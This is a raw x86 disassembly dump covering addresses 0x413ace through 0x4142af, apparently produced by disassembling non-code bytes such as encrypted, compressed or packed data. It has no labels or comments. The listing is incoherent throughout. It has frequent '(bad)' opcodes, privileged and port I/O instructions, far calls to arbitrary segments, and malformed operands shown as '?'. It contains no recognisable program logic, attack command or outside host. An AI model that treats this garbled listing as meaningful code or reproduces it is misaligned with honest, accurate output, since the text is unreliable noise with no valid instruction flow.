  413ace:	and    BYTE PTR [ecx],cl
  413ad0:	jno    0x413ad2
  413ad2:	pop    esp
  413ad3:	sub    ebx,DWORD PTR [eax+0x53bbb882]
  413ad9:	mov    ecx,DWORD PTR [edi+ecx*4]
  413adc:	sub    eax,0x5cedd0ff
  413ae1:	and    al,dh
  413ae3:	or     bh,BYTE PTR [ecx+0x130031b5]
  413ae9:	(bad)  
  413aeb:	or     BYTE PTR [ebx],0x1d
  413aee:	add    al,0xb3
  413af0:	cmc    
  413af1:	and    eax,0xa8569f8c
  413af6:	mov    dh,0xa1
  413af8:	sbb    ebx,DWORD PTR [eax+edi*4-0x4885b03e]
  413aff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b00:	test   al,0xed
  413b02:	das    
  413b03:	add    al,0xe3
  413b05:	jecxz  0x413b1a
  413b07:	dec    esi
  413b08:	and    ebx,DWORD PTR [esp+edx*2+0x6a895b82]
  413b0f:	xchg   ebp,eax
  413b10:	pop    ebx
  413b11:	(bad)  
  413b13:	sub    eax,0xeda3616
  413b18:	(bad)  
  413b19:	enter  0x4119,0x2a
  413b1d:	retf   
  413b1e:	and    bl,bh
  413b20:	ss push esp
  413b22:	ins    BYTE PTR es:[edi],dx
  413b23:	aaa    
  413b24:	jmp    0x2e3f:0xdedaeb1f
  413b2b:	dec    ebx
  413b2c:	aad    0xb6
  413b2e:	inc    ebp
  413b2f:	xor    al,0x69
  413b31:	sub    BYTE PTR [edx],ah
  413b33:	loopne 0x413b21
  413b35:	mov    ah,0x2b
  413b37:	mov    bl,BYTE PTR [ebp-0x4d]
  413b3a:	xchg   ecx,eax
  413b3b:	in     al,dx
  413b3c:	sub    eax,esi
  413b3e:	retf   0x12b6
  413b41:	jne    0x413b53
  413b43:	enter  0x1b1a,0x7b
  413b47:	push   ecx
  413b48:	or     ebx,DWORD PTR [ebx-0x55]
  413b4b:	fcmovbe st,st(7)
  413b4d:	jmp    0x196f94d8
  413b52:	sbb    eax,0x406b625d
  413b57:	pop    ds
  413b58:	stos   BYTE PTR es:[edi],al
  413b59:	pop    esp
  413b5a:	test   eax,0xb1b00506
  413b5f:	xor    eax,0xfb1d32a2
  413b64:	es lahf 
  413b66:	add    BYTE PTR [ecx],0xed
  413b69:	and    bh,BYTE PTR [eax-0x49d2ef39]
  413b6f:	mov    dl,0xeb
  413b71:	mov    dh,0xb5
  413b73:	ins    DWORD PTR es:[edi],dx
  413b74:	dec    ebp
  413b75:	add    eax,0xd7a80b31
  413b7a:	lods   eax,DWORD PTR ds:[esi]
  413b7b:	sub    BYTE PTR [ebx+0x71],0xb4
  413b7f:	fcmovnb st,st(2)
  413b81:	shl    BYTE PTR [ebp+0x17],cl
  413b84:	sbb    BYTE PTR [ebx+0x579c5611],bh
  413b8a:	add    bh,BYTE PTR [ebx]
  413b8c:	sub    BYTE PTR [esi+0x6c],0x18
  413b90:	add    ecx,DWORD PTR [edi]
  413b92:	test   eax,0x5e14687
  413b97:	ins    BYTE PTR es:[edi],dx
  413b98:	sbb    ebx,DWORD PTR [ebp+0x4]
  413b9b:	push   esi
  413b9c:	mov    ebp,0x7f3e225d
  413ba1:	mov    ebx,0xa86e50b0
  413ba6:	mov    BYTE PTR [ecx+ebx*1],ch
  413ba9:	xchg   ah,bl
  413bab:	inc    ebx
  413bac:	push   ebp
  413bad:	aam    0x1
  413baf:	dec    ebx
  413bb0:	adc    al,0x6d
  413bb2:	in     al,0xef
  413bb4:	pop    edi
  413bb5:	clc    
  413bb6:	call   0x34f3:0xde5d5ba2
  413bbd:	mov    esi,0x36303504
  413bc2:	adc    eax,0xaa62db71
  413bc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413bc8:	push   ebp
  413bc9:	xchg   esi,eax
  413bca:	push   eax
  413bcb:	lahf   
  413bcc:	std    
  413bcd:	pop    ebp
  413bce:	fcomp  DWORD PTR [edx]
  413bd0:	add    bl,bl
  413bd2:	sahf   
  413bd3:	push   esi
  413bd4:	sbb    BYTE PTR [eax+0x116b0dd0],cl
  413bda:	sbb    eax,0xa0280301
  413bdf:	repnz sub al,BYTE PTR [edi-0x30]
  413be3:	jbe    0x413c26
  413be5:	retf   
  413be6:	jp     0x413c2f
  413be8:	jb     0x413bef
  413bea:	sub    BYTE PTR [ebp-0x207a51db],0x77
  413bf1:	push   0x8a0fad94
  413bf6:	clts   
  413bf8:	gs rcr ecx,0x6c
  413bfc:	ins    DWORD PTR es:[edi],dx
  413bfd:	sub    al,0x2d
  413bff:	in     eax,0x8
  413c01:	inc    edi
  413c02:	xchg   esi,eax
  413c03:	xchg   DWORD PTR [edx+ebp*2+0x6db6e37d],ecx
  413c0a:	pop    ebx
  413c0b:	pop    ebp
  413c0c:	sub    DWORD PTR [ebp-0x25f073a9],0x1bcf9822
  413c16:	add    al,0xae
  413c18:	pusha  
  413c19:	mov    edi,0x143ee5d7
  413c1e:	mov    bh,0x3a
  413c20:	sub    BYTE PTR [edi],0x8
  413c23:	cld    
  413c24:	dec    esp
  413c25:	mov    al,ds:0x82e8b74
  413c2a:	jbe    0x413bdc
  413c2c:	push   edi
  413c2d:	shl    bl,cl
  413c2f:	or     cl,BYTE PTR [edx-0x691d44f5]
  413c35:	fmul   st(2),st
  413c37:	in     eax,dx
  413c38:	out    0x99,eax
  413c3a:	sbb    ah,dh
  413c3c:	pop    edx
  413c3d:	pop    ebx
  413c3e:	or     ebx,DWORD PTR ds:0x9aef1205
  413c44:	iret   
  413c45:	inc    esi
  413c46:	pop    ds
  413c47:	les    eax,FWORD PTR [esi+0x48326db8]
  413c4d:	pop    edi
  413c4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413c4f:	mov    al,0x0
  413c51:	xlat   BYTE PTR ds:[ebx]
  413c52:	push   0x55db65b4
  413c57:	mov    edi,ebx
  413c59:	mov    eax,0x5adbd47
  413c5e:	fnsave [esi+0x75126d52]
  413c64:	xor    eax,0x88444c80
  413c69:	popa   
  413c6a:	sub    dl,BYTE PTR [edi+0x5b]
  413c6d:	sti    
  413c6e:	mov    eax,ds:0x3a1d44e4
  413c73:	sub    eax,0xbb42e914
  413c78:	mov    ch,0xe0
  413c7a:	mov    dh,0x20
  413c7c:	mov    esi,0x379494d
  413c81:	in     al,dx
  413c82:	mov    eax,0xd752db6d
  413c87:	call   0xf050:0x56d1ed86
  413c8e:	imul   edi,DWORD PTR [eax-0x4aa7ebd3],0x108bea49
  413c98:	xchg   edx,eax
  413c99:	pop    esp
  413c9a:	xor    BYTE PTR ds:0xf10a9b11,cl
  413ca0:	int    0x18
  413ca2:	pop    ecx
  413ca3:	into   
  413ca4:	ins    BYTE PTR es:[edi],dx
  413ca5:	dec    edi
  413ca6:	push   esp
  413ca7:	sbb    esp,esp
  413ca9:	cmp    eax,DWORD PTR [edx-0x50]
  413cac:	repnz push 0x9
  413caf:	mov    eax,0xdcd92c2d
  413cb4:	push   ebp
  413cb5:	ret    0x4d2f
  413cb8:	in     eax,0xfa
  413cba:	push   esi
  413cbb:	inc    ecx
  413cbc:	add    DWORD PTR [edx+0x6d07bab2],esp
  413cc2:	sbb    ebx,ebx
  413cc4:	lea    edx,[ecx-0x2f]
  413cc7:	xchg   esp,eax
  413cc8:	xor    eax,0xdaf7729e
  413ccd:	fst    QWORD PTR [ecx-0x46]
  413cd0:	rcl    DWORD PTR ds:0x8a789001,1
  413cd6:	or     esi,0x2
  413cd9:	mov    eax,0xbe24bad0
  413cde:	loop   0x413d1a
  413ce0:	mov    esi,0xd0d44ae
  413ce5:	add    BYTE PTR [ebx],bl
  413ce7:	bound  ebp,QWORD PTR [esp+ebp*1-0x3a5f26e1]
  413cee:	add    eax,0x22041d6e
  413cf3:	xor    ebp,DWORD PTR [edx+0x74f6cd89]
  413cf9:	add    eax,0x157000b1
  413cfe:	bswap  ebp
  413d00:	fmul   st(2),st
  413d02:	das    
  413d03:	ins    BYTE PTR es:[edi],dx
  413d04:	dec    eax
  413d05:	shl    DWORD PTR [ebx+ebp*8],cl
  413d08:	enter  0xfd00,0xda
  413d0c:	jge    0x413d63
  413d0e:	jecxz  0x413d13
  413d10:	test   DWORD PTR ds:0xb2a61f45,ecx
  413d16:	pop    ds
  413d17:	nop
  413d18:	jno    0x413d7b
  413d1a:	imul   ebx,DWORD PTR [ebx+0x3c],0x3b
  413d1e:	push   0x6b
  413d20:	out    0x47,al
  413d22:	pop    ebx
  413d23:	inc    esp
  413d24:	adc    al,0xad
  413d26:	adc    cl,dl
  413d28:	inc    ecx
  413d29:	xor    ecx,DWORD PTR [eax-0x3fef4635]
  413d2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d30:	lea    eax,[edi]
  413d32:	mov    edx,0xd9212022
  413d37:	add    bl,cl
  413d39:	mov    edi,0x951f3ed4
  413d3e:	adc    esp,DWORD PTR [eax+0x91a600]
  413d44:	pop    ebp
  413d45:	mul    DWORD PTR [eax-0x28925e9d]
  413d4b:	(bad)  fs:[eax]
  413d4e:	retf   
  413d4f:	nop
  413d50:	pop    ebx
  413d51:	xchg   edi,eax
  413d52:	fimul  DWORD PTR ss:[esi]
  413d55:	sti    
  413d56:	sub    eax,0x517b9e50
  413d5b:	cwde   
  413d5c:	(bad)  
  413d5d:	fsubr  st,st(5)
  413d5f:	push   esi
  413d60:	add    edx,DWORD PTR [esp+ebx*4]
  413d63:	xlat   BYTE PTR ds:[ebx]
  413d64:	push   edx
  413d65:	mov    edi,0xe22a3ef1
  413d6a:	mov    dh,0xb5
  413d6c:	ins    BYTE PTR es:[edi],dx
  413d6d:	mov    eax,ds:0x9b08785c
  413d72:	hlt    
  413d73:	mov    ds:0x866d004d,al
  413d78:	lock fdiv DWORD PTR [esi]
  413d7b:	pop    ds
  413d7c:	cwde   
  413d7d:	bound  eax,QWORD PTR [edi]
  413d7f:	add    eax,0xdcafd19b
  413d84:	outs   dx,BYTE PTR ds:[esi]
  413d85:	or     BYTE PTR [edi-0x25],dh
  413d88:	adc    DWORD PTR [ebp-0x3686c875],esi
  413d8e:	dec    edx
  413d8f:	jmp    0x418bee4c
  413d94:	fild   DWORD PTR [edx-0x7e]
  413d97:	mov    esp,0x1b41b2e6
  413d9c:	call   0x39a254b4
  413da1:	das    
  413da2:	mov    al,ds:0x95748be4
  413da7:	xlat   BYTE PTR ds:[ebx]
  413da8:	ins    DWORD PTR es:[edi],dx
  413da9:	fistp  DWORD PTR [edx+0xf9b391a]
  413daf:	out    0xfb,al
  413db1:	sub    DWORD PTR [eax],ebx
  413db3:	pop    edi
  413db4:	mov    ch,0x83
  413db6:	mov    edx,0xd44ad5b5
  413dbb:	push   ebx
  413dbc:	lea    esi,[esi+0x6c5c0801]
  413dc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413dc3:	pop    ebp
  413dc4:	lods   al,BYTE PTR ds:[esi]
  413dc5:	mov    esp,0xba860526
  413dca:	jne    0x413e39
  413dcc:	inc    ebx
  413dcd:	inc    esp
  413dce:	fsub   QWORD PTR [esi]
  413dd0:	xor    ebx,DWORD PTR [eax+0x46]
  413dd3:	jnp    0x413e2b
  413dd5:	pop    edi
  413dd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413dd7:	add    BYTE PTR [esi],ch
  413dd9:	mov    ah,0x2d
  413ddb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ddc:	addr16 push eax
  413dde:	and    eax,0x825ad648
  413de3:	mov    dh,0x20
  413de5:	push   eax
  413de6:	jg     0x413dd5
  413de8:	mov    edi,?
  413dea:	pop    ss
  413deb:	mov    dh,0xb
  413ded:	fcmovnb st,st(6)
  413def:	push   0x8d380c42
  413df4:	add    edx,esi
  413df6:	jo     0x413e0c
  413df8:	or     DWORD PTR [ebp+0x72208685],ecx
  413dfe:	imul   esp,edx,0x38
  413e01:	jle    0x413dc5
  413e03:	mov    dh,0xb5
  413e05:	stos   BYTE PTR es:[edi],al
  413e06:	sbb    eax,esp
  413e08:	jge    0x413e3e
  413e0a:	inc    esp
  413e0b:	xchg   ecx,eax
  413e0c:	pop    eax
  413e0d:	mov    es,WORD PTR [edx]
  413e0f:	outs   dx,BYTE PTR ds:[esi]
  413e10:	fstp   TBYTE PTR [ebx]
  413e12:	inc    ecx
  413e13:	shl    ebp,1
  413e15:	cs xchg edi,eax
  413e17:	shl    DWORD PTR [eax-0xc495f4b],1
  413e1d:	xor    cl,BYTE PTR [edi]
  413e1f:	pop    ebx
  413e20:	push   cs
  413e21:	jno    0x413e8e
  413e23:	jmp    0x413e47
  413e25:	mov    edx,0x84ee1b25
  413e2a:	adc    BYTE PTR [ebx+0x37],ch
  413e2d:	popf   
  413e2e:	or     dl,BYTE PTR [esi+0x4f6c75aa]
  413e34:	or     dh,dl
  413e36:	cmp    DWORD PTR [esi-0x56452493],esi
  413e3c:	aad    0xe6
  413e3e:	ds xchg ebp,eax
  413e40:	xchg   ebp,eax
  413e41:	cmc    
  413e42:	or     al,BYTE PTR [edi+0x2e]
  413e45:	in     eax,dx
  413e46:	mov    BYTE PTR [ebx],0x37
  413e49:	pusha  
  413e4a:	or     DWORD PTR [edi-0x1d3cbf6a],0xffffffea
  413e51:	bound  esi,QWORD PTR [esi-0x27fe5caa]
  413e57:	pushf  
  413e58:	sti    
  413e59:	sbb    dl,BYTE PTR [esi]
  413e5b:	popa   
  413e5c:	imul   edi,DWORD PTR [ebx+0x78c38702],0x26
  413e63:	mov    esp,edi
  413e65:	push   ebp
  413e66:	rol    BYTE PTR [ecx],1
  413e68:	shl    DWORD PTR [esi-0x5],0xc7
  413e6c:	inc    esp
  413e6d:	xchg   ebp,eax
  413e6e:	icebp  
  413e6f:	sahf   
  413e70:	fstp   TBYTE PTR [edx+0x455b5a39]
  413e76:	enter  0xccaa,0x8b
  413e7a:	cmp    dh,BYTE PTR [esi+0x6d1b8aed]
  413e80:	pop    ebp
  413e81:	pop    DWORD PTR [edx+0x57]
  413e84:	dec    eax
  413e85:	lock dec esp
  413e87:	in     eax,dx
  413e88:	mov    ?,WORD PTR [eax-0x79debf2b]
  413e8e:	call   0xdf1b:0xad20ae5a
  413e95:	test   DWORD PTR [esi],ebx
  413e97:	aaa    
  413e98:	in     al,dx
  413e99:	mov    dl,cl
  413e9b:	and    ebx,esi
  413e9d:	inc    esp
  413e9e:	xchg   ebx,eax
  413e9f:	dec    edi
  413ea0:	mov    dh,0x45
  413ea2:	mov    ch,0xb
  413ea4:	mov    esi,0xb71ac982
  413ea9:	mov    dl,0x62
  413eab:	(bad)  [esi+0x14]
  413eae:	mov    bh,0x71
  413eb0:	jecxz  0x413e9d
  413eb2:	sub    al,0x9
  413eb4:	in     eax,0xa7
  413eb6:	pushf  
  413eb7:	inc    edi
  413eb8:	arpl   bx,bx
  413eba:	call   0xf702:0xbd659360
  413ec1:	in     al,dx
  413ec2:	xlat   BYTE PTR ds:[ebx]
  413ec3:	cmp    al,0xb6
  413ec5:	test   DWORD PTR [ebp+0x40b7de70],ebp
  413ecb:	or     DWORD PTR [esi-0x48],0x12
  413ecf:	out    dx,eax
  413ed0:	add    al,BYTE PTR [ebp+0x29ad8dc6]
  413ed6:	and    eax,0x39baed84
  413edb:	xchg   ecx,eax
  413edc:	ins    DWORD PTR es:[edi],dx
  413edd:	xchg   edi,eax
  413ede:	mov    dh,0xad
  413ee0:	aas    
  413ee1:	or     eax,0x4d495631
  413ee6:	jns    0x413f0e
  413ee8:	push   cs
  413ee9:	sbb    eax,0x44d6d2d
  413eee:	jl     0x413f54
  413ef0:	or     ecx,esi
  413ef2:	sbb    dl,BYTE PTR [ecx-0x7e]
  413ef5:	add    eax,0xcace2d6e
  413efa:	add    al,0x30
  413efc:	out    0x9f,eax
  413efe:	push   edx
  413eff:	sub    eax,0xc80615b0
  413f04:	arpl   WORD PTR [esi+0x4b],si
  413f07:	or     ebp,eax
  413f09:	mov    ds:0x3238bb60,al
  413f0e:	jo     0x413f42
  413f10:	mov    al,ds:0x182e30f0
  413f15:	or     dh,BYTE PTR [edi]
  413f17:	imul   eax,DWORD PTR [edi+0x4589141],0xffffffbb
  413f1e:	mov    ds:0x3ad8dda,al
  413f23:	jne    0x413f11
  413f25:	ret    0xc60f
  413f28:	daa    
  413f29:	xor    eax,0x4435b162
  413f2e:	pop    ss
  413f2f:	lods   al,BYTE PTR ds:[esi]
  413f30:	mov    cl,0x73
  413f32:	inc    esi
  413f33:	sub    al,0xf8
  413f35:	xchg   ecx,eax
  413f36:	push   0xfa16b76b
  413f3b:	(bad)  
  413f3c:	imul   BYTE PTR [ecx+0xe]
  413f3f:	cmp    BYTE PTR [edi-0x7d],0xb6
  413f43:	mov    ebp,eax
  413f45:	and    eax,0x4df5cd64
  413f4a:	ret    0xdaa4
  413f4d:	ins    DWORD PTR es:[edi],dx
  413f4e:	mov    eax,ds:0x393df171
  413f53:	cli    
  413f54:	push   esp
  413f55:	fwait
  413f56:	sub    al,0x88
  413f58:	into   
  413f59:	add    al,0x5c
  413f5b:	fcom   DWORD PTR [esi+0x54d7cf83]
  413f61:	mov    ebx,0xa0db0418
  413f66:	xor    DWORD PTR [esi+0x7d],0x8502545d
  413f6d:	dec    ebp
  413f6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f6f:	mov    DWORD PTR [edx-0x5b9695db],esp
  413f75:	inc    esp
  413f76:	mov    ah,0x85
  413f78:	pop    es
  413f79:	popa   
  413f7a:	mov    ds:0x34033add,eax
  413f7f:	(bad)  
  413f81:	call   0x34e47ed0
  413f86:	sbb    ebx,ebx
  413f88:	lods   eax,DWORD PTR ds:[esi]
  413f89:	ins    DWORD PTR es:[edi],dx
  413f8a:	ja     0x413f8e
  413f8c:	jecxz  0x413fc2
  413f8e:	out    dx,eax
  413f8f:	jnp    0x413fae
  413f91:	jp     0x413f26
  413f93:	rol    ah,0x16
  413f96:	or     ebx,DWORD PTR [ebx]
  413f98:	add    edx,0x40fab1f
  413f9e:	mov    ch,0xed
  413fa0:	(bad)  
  413fa1:	add    eax,0x323822f4
  413fa6:	mov    cl,0xb
  413fa8:	sbb    esi,DWORD PTR [ecx+0x6c]
  413fab:	test   DWORD PTR [esi-0x5917a650],esi
  413fb1:	jle    0x413f42
  413fb3:	xchg   ebx,eax
  413fb4:	inc    edi
  413fb5:	dec    edx
  413fb6:	or     bl,dl
  413fb8:	ss push eax
  413fba:	cs inc esi
  413fbc:	(bad)  
  413fbd:	adc    ebp,DWORD PTR gs:[ebp+ebp*4+0x6b]
  413fc2:	imul   ecx,DWORD PTR [eax],0x75
  413fc5:	lods   eax,DWORD PTR ds:[esi]
  413fc6:	cld    
  413fc7:	jg     0x414041
  413fc9:	das    
  413fca:	pop    ss
  413fcb:	aam    0xb7
  413fcd:	call   0xae5f:0xfd462e22
  413fd4:	mov    DWORD PTR [eax-0x6e],0xdc2b7565
  413fdb:	push   0xffffff95
  413fdd:	mov    ebx,0xd1be1c8a
  413fe2:	aas    
  413fe3:	(bad)
  413fe6:	sbb    BYTE PTR ds:0x62f96a00,0x18
  413fed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413fee:	mov    dh,0xdb
  413ff0:	inc    esi
  413ff1:	inc    edi
  413ff2:	mov    ebx,0xc2dc2a16
  413ff7:	mov    dh,0x63
  413ff9:	pop    edi
  413ffa:	mov    WORD PTR [ecx+0x70],ss
  413ffd:	test   eax,0x4d78be29
  414002:	out    0x89,eax
  414004:	sti    
  414005:	push   ebp
  414006:	rcl    dh,0x57
  414009:	mov    bh,0x92
  41400b:	(bad)  
  41400d:	sub    al,BYTE PTR [ebp+0x56b6dc50]
  414013:	push   eax
  414014:	int    0x3e
  414016:	pop    eax
  414017:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414018:	cmp    BYTE PTR [edx+ebp*2],ah
  41401b:	and    bl,dl
  41401d:	adc    eax,0x70263c83
  414022:	lea    ebp,[esi+0x1d]
  414025:	add    eax,0x7f29d9dd
  41402a:	hlt    
  41402b:	add    cl,BYTE PTR [edx+0x34]
  41402e:	or     DWORD PTR [esi-0x432497dd],esi
  414034:	popf   
  414035:	push   0xe56acf73
  41403a:	je     0x41403c
  41403c:	jo     0x414019
  41403e:	retf   0x6b02
  414041:	xchg   BYTE PTR fs:[eax+0x2c0b6c70],bl
  414048:	je     0x41400f
  41404a:	daa    
  41404b:	call   0x6a2f:0xd4b90095
  414052:	xchg   edi,eax
  414053:	xchg   edi,eax
  414054:	outs   dx,BYTE PTR ds:[esi]
  414055:	cmp    si,cx
  414058:	mov    DWORD PTR [eax-0xb04ed00],eax
  41405e:	inc    edi
  41405f:	imul   ebp,DWORD PTR [ebx],0x5c
  414062:	pop    edx
  414063:	push   cs
  414064:	jb     0x41404f
  414066:	in     al,dx
  414067:	in     al,0x88
  414069:	add    dh,cl
  41406b:	out    dx,al
  41406c:	in     eax,dx
  41406d:	(bad)  
  41406e:	push   esi
  41406f:	jle    0x414041
  414071:	loop   0x414073
  414073:	xlat   BYTE PTR ds:[ebx]
  414074:	adc    BYTE PTR [esi+ebp*8],0x2a
  414078:	bound  esi,QWORD PTR [edx-0x14]
  41407b:	mov    al,0x2b
  41407d:	xor    BYTE PTR [esi-0x5ecf3aff],0xbe
  414084:	pop    eax
  414085:	mov    dh,0xd1
  414087:	(bad)  
  414088:	add    al,ch
  41408a:	retf   
  41408b:	pop    ecx
  41408c:	cmp    BYTE PTR [ecx-0x49c86d06],ch
  414092:	push   es
  414093:	loop   0x41409a
  414095:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414096:	mov    edx,0xde1bd862
  41409c:	les    esi,FWORD PTR [esi+0x44]
  41409f:	mov    al,0x6d
  4140a1:	sahf   
  4140a2:	inc    edi
  4140a3:	pop    edi
  4140a4:	pop    ds
  4140a5:	xor    ebp,DWORD PTR [ecx+0x50ba8b1b]
  4140ab:	ficomp DWORD PTR [edx]
  4140ad:	or     edi,DWORD PTR [esi]
  4140af:	pop    ds
  4140b0:	cmc    
  4140b1:	pop    esp
  4140b2:	push   DWORD PTR [eax+ecx*1-0xd07494a]
  4140b9:	mov    esp,0x8511448f
  4140be:	and    ch,BYTE PTR es:[esi-0x19]
  4140c2:	leave  
  4140c3:	imul   edx,DWORD PTR [edx],0x82d17f58
  4140c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4140ca:	test   DWORD PTR [ecx-0x72],edx
  4140cd:	jecxz  0x41406d
  4140cf:	mov    al,0x88
  4140d1:	ins    BYTE PTR es:[edi],dx
  4140d2:	adc    al,0xdb
  4140d4:	mov    dh,0x99
  4140d6:	fwait
  4140d7:	imul   edi,DWORD PTR [edx-0x359d5717],0xffffffe8
  4140de:	stos   BYTE PTR es:[edi],al
  4140df:	or     eax,0x3c3c7640
  4140e4:	push   edx
  4140e5:	into   
  4140e6:	outs   dx,BYTE PTR ds:[esi]
  4140e7:	mov    ch,0x68
  4140e9:	(bad)  
  4140eb:	stos   BYTE PTR es:[edi],al
  4140ec:	inc    esp
  4140ed:	stos   DWORD PTR es:[edi],eax
  4140ee:	mov    eax,ds:0x3608c631
  4140f3:	lds    esp,FWORD PTR [esi]
  4140f5:	and    dh,ah
  4140f7:	push   edi
  4140f8:	cwde   
  4140f9:	push   edx
  4140fa:	push   cs
  4140fb:	fdiv   DWORD PTR [esi-0x2b2912e5]
  414101:	mov    ecx,0x3ca4237f
  414106:	call   0x8891f438
  41410b:	pop    ebx
  41410c:	pop    ebx
  41410d:	fldenv [ebp+esi*2-0x1eaa25bf]
  414114:	xor    eax,0x2ea836d0
  414119:	sbb    ebx,esp
  41411b:	jecxz  0x414198
  41411d:	adc    DWORD PTR [edx-0xb4b44a5],esp
  414123:	ss dec ebp
  414125:	in     eax,dx
  414126:	inc    ebp
  414127:	bound  ebx,QWORD PTR [ebx-0x5277ee64]
  41412d:	ins    BYTE PTR es:[edi],dx
  41412e:	fwait
  41412f:	adc    al,0x54
  414131:	icebp  
  414132:	xlat   BYTE PTR ds:[ebx]
  414133:	pop    ecx
  414134:	je     0x41415b
  414136:	mov    BYTE PTR [esi-0x137a725e],al
  41413c:	adc    DWORD PTR [ecx+eiz*2],ebx
  41413f:	pop    ebx
  414140:	mov    edx,0xd4dc715
  414145:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414146:	jno    0x4140cd
  414148:	lods   eax,DWORD PTR ds:[esi]
  414149:	sar    DWORD PTR ds:0x6d8a86c2,1
  41414f:	xor    edi,DWORD PTR [edx-0x45]
  414152:	xchg   esi,eax
  414153:	or     bl,dl
  414155:	xor    DWORD PTR [ebp+0x2d],ebp
  414158:	push   0x35f49ba1
  41415d:	push   eax
  41415e:	jge    0x41411b
  414160:	add    al,bl
  414162:	cs push esi
  414164:	sahf   
  414165:	(bad)  
  414166:	xor    ah,cl
  414168:	push   ecx
  414169:	xlat   BYTE PTR ds:[ebx]
  41416a:	jg     0x414176
  41416c:	push   ecx
  41416d:	push   edi
  41416e:	adc    BYTE PTR [ebx],dh
  414170:	outs   dx,DWORD PTR ds:[esi]
  414171:	mov    esi,0xd882d6ed
  414176:	repnz pusha 
  414178:	aas    
  414179:	inc    esp
  41417a:	retf   
  41417b:	(bad)  
  41417d:	fcomp  DWORD PTR [edx]
  41417f:	mov    ch,BYTE PTR [esi-0x4a]
  414182:	test   eax,0x503d1ddf
  414187:	hlt    
  414188:	je     0x414133
  41418a:	sub    eax,0x6e43ccdd
  41418f:	cwde   
  414190:	jns    0x41418a
  414192:	jge    0x4141b1
  414194:	pushf  
  414195:	mov    cl,0xd1
  414197:	ss add ah,dl
  41419a:	clc    
  41419b:	mov    ds:0xb5b7b59,al
  4141a0:	xor    al,0x40
  4141a2:	sbb    edi,DWORD PTR [eax]
  4141a4:	mov    ds:0xb3abdbb9,al
  4141a9:	add    DWORD PTR [ebp+0x3654002d],esi
  4141af:	xor    bl,BYTE PTR [edx-0x24a4b4a5]
  4141b5:	pusha  
  4141b6:	jg     0x4141a8
  4141b8:	push   ebx
  4141b9:	mov    esp,0x71898c8
  4141be:	push   ecx
  4141bf:	add    eax,0xc275a974
  4141c4:	push   ebx
  4141c5:	into   
  4141c6:	push   eax
  4141c7:	sti    
  4141c8:	in     al,0x8b
  4141ca:	test   ebp,ecx
  4141cc:	aad    0xbf
  4141ce:	dec    esi
  4141cf:	std    
  4141d0:	cwde   
  4141d1:	push   0xffffffe8
  4141d3:	ins    BYTE PTR es:[edi],dx
  4141d4:	and    ecx,0x556096d6
  4141da:	push   0x5e533eab
  4141df:	sbb    DWORD PTR [ebp-0x4a],ebp
  4141e2:	xchg   esi,eax
  4141e3:	dec    edx
  4141e4:	push   ecx
  4141e5:	jmp    0xd30563af
  4141ea:	push   esi
  4141eb:	mov    cl,0x15
  4141ed:	sub    BYTE PTR [ebp-0x4abd44d4],dh
  4141f3:	test   DWORD PTR [eax-0x48a6aa53],eax
  4141f9:	mov    bh,0xf8
  4141fb:	ins    BYTE PTR es:[edi],dx
  4141fc:	fild   DWORD PTR [ebp+0x4b1f8412]
  414202:	pusha  
  414203:	adc    DWORD PTR [edx-0x74],edi
  414206:	inc    edx
  414207:	stos   BYTE PTR es:[edi],al
  414208:	mov    eax,0x53ae55d0
  41420d:	add    DWORD PTR [esi+0x6b70ad25],ecx
  414213:	fwait
  414214:	dec    edi
  414215:	mov    WORD PTR [edx-0x6f83737d],ss
  41421b:	sub    ebp,DWORD PTR [eax-0x4b]
  41421e:	sub    eax,0x5b9e8500
  414223:	sbb    ebx,esp
  414225:	xchg   ebp,eax
  414226:	sbb    bl,0x57
  414229:	mov    bh,0x6
  41422b:	imul   ecx,ebx,0x7e
  41422e:	ret    0xf7f2
  414231:	push   ebx
  414232:	dec    edi
  414233:	or     BYTE PTR [esi+0x6dd44b88],0xa9
  41423a:	xor    DWORD PTR [ebp+ebx*8-0x3f27d718],ebp
  414241:	das    
  414242:	in     al,0x1c
  414244:	imul   ecx,DWORD PTR [ebx],0xda51bb3c
  41424a:	inc    esp
  41424b:	xchg   ecx,eax
  41424c:	lods   eax,DWORD PTR ds:[esi]
  41424d:	aas    
  41424e:	inc    esp
  41424f:	in     eax,0x45
  414251:	pop    ss
  414252:	or     dh,dl
  414254:	stos   BYTE PTR es:[edi],al
  414255:	or     ebx,DWORD PTR [ebx+0x2c]
  414258:	lock or bh,BYTE PTR [edx+eiz*2+0x162bec4f]
  414260:	ss retf 0x7e1b
  414264:	loopne 0x41428e
  414266:	fisttp QWORD PTR [ecx]
  414268:	mov    cl,0xed
  41426a:	add    BYTE PTR [eax-0x1],ah
  41426d:	xchg   BYTE PTR [eax],dl
  41426f:	mov    edx,0x36144c20
  414274:	add    al,0xb1
  414276:	dec    eax
  414277:	jmp    0x4142cd
  414279:	retf   0xaf4e
  41427c:	fld    TBYTE PTR [eax+0x2a]
  41427f:	outs   dx,BYTE PTR ds:[esi]
  414280:	stos   DWORD PTR es:[edi],eax
  414281:	cmp    BYTE PTR [ecx-0x7e],ch
  414284:	sbb    edx,DWORD PTR [edx]
  414286:	mov    cl,0x3e
  414288:	push   eax
  414289:	jno    0x41420c
  41428b:	ins    DWORD PTR es:[edi],dx
  41428c:	mov    DWORD PTR [esi-0x6d9e9cd5],0x756db6c0
  414296:	pusha  
  414297:	jo     0x4142fa
  414299:	xor    al,0x35
  41429b:	cmc    
  41429c:	pop    esp
  41429d:	sub    ebx,DWORD PTR [ebx-0x57]
  4142a0:	xor    BYTE PTR [ecx+0x6ddf1acc],dh
  4142a6:	sub    ecx,eax
  4142a8:	dec    ebx
  4142a9:	or     ebp,DWORD PTR [ebx+ebx*1-0x3a]
  4142ad:	xchg   esi,eax
  4142ae:	into   
  4142af:	adc    al,0xba
